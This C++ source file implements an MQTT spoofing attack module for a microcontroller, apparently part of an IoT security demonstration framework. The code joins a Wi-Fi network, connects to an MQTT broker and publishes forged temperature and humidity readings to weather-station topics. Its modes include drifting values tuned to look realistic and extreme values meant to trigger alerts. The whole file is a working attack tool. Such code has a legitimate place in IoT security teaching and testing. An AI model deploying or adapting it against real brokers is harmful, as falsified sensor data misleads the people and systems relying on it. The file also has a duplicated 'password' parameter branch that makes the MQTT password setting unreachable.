/*
 * MqttSpoofAttack.cpp
 * 
 * Implementation of the MQTT Spoofing Attack module
 */

#include "MqttSpoofAttack.h"

MqttSpoofAttack::MqttSpoofAttack() : Attack(ATTACK_TYPE_MQTT_SPOOF, "MQTT Spoofing") {
  // Initialize parameters with defaults
  ssid = "";
  password = "";
  
  mqttServer = "192.168.1.100";
  mqttPort = 1883;
  mqttClientId = "SECoT_MQTT_Spoofer";
  mqttUsername = "";
  mqttPassword = "";
  
  topicPrefix = "home/weatherstation/";
  topicTemperature = topicPrefix + "temperature";
  topicHumidity = topicPrefix + "humidity";
  
  attackMode = MQTT_ATTACK_MODE_REALISTIC_DRIFT;
  publishInterval = DEFAULT_MQTT_SPOOF_INTERVAL;
  
  fakeTemperature = 25.0;
  fakeHumidity = 50.0;
  increasing = true;
  modeCounter = 0;
  
  mqttClient = new PubSubClient(espClient);
}

MqttSpoofAttack::~MqttSpoofAttack() {
  // Clean up
  stop();
  delete mqttClient;
}

bool MqttSpoofAttack::start(unsigned long duration) {
  // Don't start if already running
  if (status == ATTACK_STATUS_RUNNING) {
    return true;
  }
  
  // Reset error message
  errorMessage = "";
  
  // Check if we have WiFi credentials
  if (ssid.length() == 0 || password.length() == 0) {
    errorMessage = "WiFi credentials not set";
    status = ATTACK_STATUS_ERROR;
    return false;
  }
  
  // Check if we have MQTT server
  if (mqttServer.length() == 0) {
    errorMessage = "MQTT server not set";
    status = ATTACK_STATUS_ERROR;
    return false;
  }
  
  // Connect to WiFi
  setupWiFi();
  
  // Configure MQTT connection
  mqttClient->setServer(mqttServer.c_str(), mqttPort);
  
  // Try to connect to MQTT broker
  if (!mqttClient->connected()) {
    reconnectMqtt();
    
    if (!mqttClient->connected()) {
      errorMessage = "Failed to connect to MQTT broker";
      status = ATTACK_STATUS_ERROR;
      return false;
    }
  }
  
  Serial.println("MQTT Spoofing Attack started");
  Serial.print("MQTT Broker: ");
  Serial.print(mqttServer);
  Serial.print(":");
  Serial.println(mqttPort);
  Serial.print("Temperature Topic: ");
  Serial.println(topicTemperature);
  Serial.print("Humidity Topic: ");
  Serial.println(topicHumidity);
  Serial.print("Attack Mode: ");
  Serial.println(attackModeToString(attackMode));
  
  // Reset fake data
  fakeTemperature = 25.0;
  fakeHumidity = 50.0;
  increasing = true;
  modeCounter = 0;
  
  // Set start time and duration
  startTime = millis();
  this->duration = duration;
  lastActionTime = 0;
  
  // Update status
  status = ATTACK_STATUS_RUNNING;
  
  return true;
}

bool MqttSpoofAttack::stop() {
  // Only stop if running
  if (status != ATTACK_STATUS_RUNNING) {
    return true;
  }
  
  // Disconnect from MQTT broker
  if (mqttClient->connected()) {
    mqttClient->disconnect();
  }
  
  // Disconnect from WiFi
  WiFi.disconnect();
  
  Serial.println("MQTT Spoofing Attack stopped");
  
  // Update status
  status = ATTACK_STATUS_STOPPING;
  
  return true;
}

void MqttSpoofAttack::update() {
  // Call base class update
  Attack::update();
  
  // Only perform actions if running
  if (status == ATTACK_STATUS_RUNNING) {
    // Ensure MQTT connection
    if (!mqttClient->connected()) {
      reconnectMqtt();
      
      if (!mqttClient->connected()) {
        errorMessage = "Lost connection to MQTT broker";
        status = ATTACK_STATUS_ERROR;
        return;
      }
    }
    
    mqttClient->loop();
    
    unsigned long currentMillis = millis();
    
    // Publish fake data at specified intervals
    if (currentMillis - lastActionTime >= publishInterval) {
      lastActionTime = currentMillis;
      
      // Generate fake data based on attack mode
      generateFakeData();
      
      // Publish fake data
      publishFakeData();
      
      // Periodically change attack mode for demonstration
      modeCounter++;
      if (modeCounter >= 20) { // Change mode every 20 publications
        modeCounter = 0;
        switchAttackMode();
      }
    }
  }
}

bool MqttSpoofAttack::setParameter(const String& name, const String& value) {
  if (name == "ssid") {
    ssid = value;
    return true;
  }
  else if (name == "password") {
    password = value;
    return true;
  }
  else if (name == "server") {
    mqttServer = value;
    return true;
  }
  else if (name == "port") {
    int port = value.toInt();
    if (port > 0 && port <= 65535) {
      mqttPort = port;
      return true;
    } else {
      errorMessage = "Invalid port number";
      return false;
    }
  }
  else if (name == "clientid") {
    mqttClientId = value;
    return true;
  }
  else if (name == "username") {
    mqttUsername = value;
    return true;
  }
  else if (name == "password") {
    mqttPassword = value;
    return true;
  }
  else if (name == "prefix") {
    topicPrefix = value;
    // Update topics
    topicTemperature = topicPrefix + "temperature";
    topicHumidity = topicPrefix + "humidity";
    return true;
  }
  else if (name == "topic_temp") {
    topicTemperature = value;
    return true;
  }
  else if (name == "topic_humidity") {
    topicHumidity = value;
    return true;
  }
  else if (name == "mode") {
    if (value == "realistic" || value == "0") {
      attackMode = MQTT_ATTACK_MODE_REALISTIC_DRIFT;
      return true;
    }
    else if (value == "extreme" || value == "1") {
      attackMode = MQTT_ATTACK_MODE_EXTREME_VALUES;
      return true;
    }
    else if (value == "oscillating" || value == "2") {
      attackMode = MQTT_ATTACK_MODE_OSCILLATING;
      return true;
    }
    else if (value == "fixed" || value == "3") {
      attackMode = MQTT_ATTACK_MODE_FIXED_VALUE;
      return true;
    }
    else {
      errorMessage = "Invalid attack mode";
      return false;
    }
  }
  else if (name == "interval") {
    int interval = value.toInt();
    if (interval >= 100) {
      publishInterval = interval;
      return true;
    } else {
      errorMessage = "Invalid interval (must be >= 100ms)";
      return false;
    }
  }
  
  errorMessage = "Unknown parameter: " + name;
  return false;
}

String MqttSpoofAttack::getParameter(const String& name) const {
  if (name == "ssid") {
    return ssid;
  }
  else if (name == "password") {
    return "********"; // Don't return actual password
  }
  else if (name == "server") {
    return mqttServer;
  }
  else if (name == "port") {
    return String(mqttPort);
  }
  else if (name == "clientid") {
    return mqttClientId;
  }
  else if (name == "username") {
    return mqttUsername;
  }
  else if (name == "password") {
    return mqttPassword.length() > 0 ? "********" : ""; // Don't return actual password
  }
  else if (name == "prefix") {
    return topicPrefix;
  }
  else if (name == "topic_temp") {
    return topicTemperature;
  }
  else if (name == "topic_humidity") {
    return topicHumidity;
  }
  else if (name == "mode") {
    return attackModeToString(attackMode);
  }
  else if (name == "interval") {
    return String(publishInterval);
  }
  
  return "";
}

String MqttSpoofAttack::getAllParameters() const {
  String params = "{";
  params += "\"ssid\":\"" + ssid + "\",";
  params += "\"password\":\"********\","; // Don't return actual password
  params += "\"server\":\"" + mqttServer + "\",";
  params += "\"port\":" + String(mqttPort) + ",";
  params += "\"clientid\":\"" + mqttClientId + "\",";
  params += "\"username\":\"" + mqttUsername + "\",";
  params += "\"password\":\"" + (mqttPassword.length() > 0 ? "********" : "") + "\",";
  params += "\"prefix\":\"" + topicPrefix + "\",";
  params += "\"topic_temp\":\"" + topicTemperature + "\",";
  params += "\"topic_humidity\":\"" + topicHumidity + "\",";
  params += "\"mode\":\"" + attackModeToString(attackMode) + "\",";
  params += "\"interval\":" + String(publishInterval);
  params += "}";
  
  return params;
}

void MqttSpoofAttack::setupWiFi() {
  Serial.println();
  Serial.print("Connecting to ");
  Serial.println(ssid);

  WiFi.begin(ssid.c_str(), password.c_str());

  // Wait for connection with timeout
  unsigned long startTime = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - startTime < 10000) {
    delay(500);
    Serial.print(".");
  }

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("");
    Serial.println("WiFi connected");
    Serial.println("IP address: ");
    Serial.println(WiFi.localIP());
  } else {
    Serial.println("");
    Serial.println("WiFi connection failed");
  }
}

void MqttSpoofAttack::reconnectMqtt() {
  // Loop until we're reconnected or timeout
  unsigned long startTime = millis();
  while (!mqttClient->connected() && millis() - startTime < 5000) {
    Serial.print("Attempting MQTT connection...");
    
    // Attempt to connect
    bool connected = false;
    if (mqttUsername.length() > 0) {
      connected = mqttClient->connect(mqttClientId.c_str(), mqttUsername.c_str(), mqttPassword.c_str());
    } else {
      connected = mqttClient->connect(mqttClientId.c_str());
    }
    
    if (connected) {
      Serial.println("connected");
    } else {
      Serial.print("failed, rc=");
      Serial.print(mqttClient->state());
      Serial.println(" try again in 1 second");
      delay(1000);
    }
  }
}

void MqttSpoofAttack::generateFakeData() {
  // Generate fake data based on current attack mode
  switch (attackMode) {
    case MQTT_ATTACK_MODE_REALISTIC_DRIFT:
      // Slowly drift values to seem realistic
      if (increasing) {
        fakeTemperature += random(10, 30) / 100.0;
        fakeHumidity += random(10, 30) / 100.0;
        
        if (fakeTemperature > 30.0 || fakeHumidity > 70.0) {
          increasing = false;
        }
      } else {
        fakeTemperature -= random(10, 30) / 100.0;
        fakeHumidity -= random(10, 30) / 100.0;
        
        if (fakeTemperature < 20.0 || fakeHumidity < 30.0) {
          increasing = true;
        }
      }
      break;
      
    case MQTT_ATTACK_MODE_EXTREME_VALUES:
      // Send extreme values to trigger alerts
      fakeTemperature = random(2) ? random(-20, -10) : random(50, 60);
      fakeHumidity = random(2) ? random(0, 5) : random(95, 100);
      break;
      
    case MQTT_ATTACK_MODE_OSCILLATING:
      // Rapidly oscillate between values
      fakeTemperature = increasing ? 35.0 : 15.0;
      fakeHumidity = increasing ? 80.0 : 20.0;
      increasing = !increasing;
      break;
      
    case MQTT_ATTACK_MODE_FIXED_VALUE:
      // Send the same value repeatedly
      fakeTemperature = 22.2;
      fakeHumidity = 44.4;
      break;
  }
}

void MqttSpoofAttack::publishFakeData() {
  // Convert float to string for publishing
  char tempString[8];
  char humString[8];
  dtostrf(fakeTemperature, 1, 2, tempString);
  dtostrf(fakeHumidity, 1, 2, humString);
  
  // Publish fake data
  mqttClient->publish(topicTemperature.c_str(), tempString);
  mqttClient->publish(topicHumidity.c_str(), humString);
  
  Serial.print("Published fake data - Temperature: ");
  Serial.print(tempString);
  Serial.print(" °C, Humidity: ");
  Serial.print(humString);
  Serial.print(" % (Mode: ");
  Serial.print(attackModeToString(attackMode));
  Serial.println(")");
}

void MqttSpoofAttack::switchAttackMode() {
  // Cycle through attack modes
  attackMode = (attackMode + 1) % 4;
  
  Serial.print("Switched attack mode to: ");
  Serial.println(attackModeToString(attackMode));
}

String MqttSpoofAttack::attackModeToString(uint8_t mode) const {
  switch (mode) {
    case MQTT_ATTACK_MODE_REALISTIC_DRIFT:
      return "REALISTIC_DRIFT";
    case MQTT_ATTACK_MODE_EXTREME_VALUES:
      return "EXTREME_VALUES";
    case MQTT_ATTACK_MODE_OSCILLATING:
      return "OSCILLATING";
    case MQTT_ATTACK_MODE_FIXED_VALUE:
      return "FIXED_VALUE";
    default:
      return "UNKNOWN";
  }
}
